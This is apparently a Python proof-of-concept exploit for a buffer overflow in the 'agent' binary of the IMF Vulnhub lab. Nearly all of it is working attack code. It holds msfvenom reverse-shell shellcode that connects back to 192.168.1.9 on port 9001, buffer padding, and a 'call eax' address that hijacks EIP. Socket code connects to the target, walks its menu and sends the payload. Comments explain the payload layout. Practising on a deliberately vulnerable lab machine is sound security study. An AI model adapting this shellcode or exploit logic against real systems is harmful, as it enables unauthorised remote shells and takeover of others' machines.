#!/usr/bin/python3

# Python3 buffer overflow PoC code 
# for exploiting agent binary in IMF - Vulnhub
# Developed by SecNigma

import sys
import socket

rhost= "192.168.1.6" # change this to target IP
rport =7788
aid="48093572\n"     # agent id to be entered


# change this shellcode to custom
# Generated by msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.9 LPORT=9001 -f python -b "\x00"  

buf =  b""
buf += b"\xd9\xc9\xd9\x74\x24\xf4\x5e\xb8\xe3\x5c\xc1\x37\x2b"
buf += b"\xc9\xb1\x12\x31\x46\x17\x03\x46\x17\x83\x25\x58\x23"
buf += b"\xc2\x98\xba\x54\xce\x89\x7f\xc8\x7b\x2f\x09\x0f\xcb"
buf += b"\x49\xc4\x50\xbf\xcc\x66\x6f\x0d\x6e\xcf\xe9\x74\x06"
buf += b"\x10\xa1\x86\xdf\xf8\xb0\x88\xfc\xd1\x3d\x69\xb2\x44"
buf += b"\x6e\x3b\xe1\x3b\x8d\x32\xe4\xf1\x12\x16\x8e\x67\x3c"
buf += b"\xe4\x26\x10\x6d\x25\xd4\x89\xf8\xda\x4a\x19\x72\xfd"
buf += b"\xda\x96\x49\x7e"

# A's to fill the buffer upto 168
a = b'\x41'*(168-len(buf))

# Initiating the connection with the remote socket
socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((rhost, rport))


# The print statements are commented out. If you want to see the output from
# the remote target, then uncomment the print statements.


stdout=socket.recv(1024)
#print(stdout.decode("utf-8"))

socket.send(bytes(aid,"utf-8"))

stdout=socket.recv(100)
#print(stdout.decode("utf-8"))
stdout=socket.recv(100)
#print(stdout.decode("utf-8"))
stdout=socket.recv(100)
#print(stdout.decode("utf-8"))


socket.send(bytes("3\r\n","utf-8"))


stdout=socket.recv(100)
#print(stdout.decode("utf-8"))

# 0x08048563 : call eax. Memory address of call eax opcode in agent binary. 
# Obtained from "http://ropshell.com/ropsearch?h=fabc1afd43f668df0b812213567d032c&p=call+eax"
# Setting EIP to this address will redirect execution flow to code in EAX, which is the start of our shellcode.

eip=b'\x63\x85\x04\x08'

#Sending the payload
socket.send(buf+a+eip+b'\n')


# Payload structure
#  _____________________________________________________________________________________________________________________________________________
# |                             |                           |                                       |                                           |
# |msfvenom reverse shellcode   | A's to fill the buffer    |                eip                    |                   \n                      |
# |     (length 95)             |  (length 168-95=73)       |   (memory address of call eax opcode) |(line break character to enter the value)  |
#  ---------------------------------------------------------------------------------------------------------------------------------------------


# Uncomment the following line to print the raw payload to stdout
#sys.stdout.buffer.write(buf+a+eip+b'\n')
stdout=socket.recv(1024)
#print(stdout)

